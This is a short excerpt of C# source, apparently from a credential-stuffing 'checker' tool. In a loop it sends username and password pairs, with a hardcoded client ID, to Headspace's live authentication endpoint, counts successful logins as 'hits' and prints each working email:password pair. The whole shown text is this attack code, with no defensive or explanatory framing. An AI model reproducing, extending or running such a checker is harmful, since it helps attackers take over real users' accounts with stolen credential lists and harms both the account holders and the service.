        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str1 = "{\"client_id\":\"xkQY1I0RgfxPhCNtJZ70cd8oTzymDT1r\",\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"realm\":\"User-Password-Headspace\",\"credential_type\":\"http://auth0.com/oauth/grant-type/password-realm\"}";
              string str2 = httpRequest.Post("https://auth.headspace.com/co/authenticate", str1, "application/json;charset=UTF-8").ToString();
              if (str2.Contains("co_verifier") || str2.Contains("200"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - HEADSPACE] " + s[0] + ":" + s[1], Color.Green);
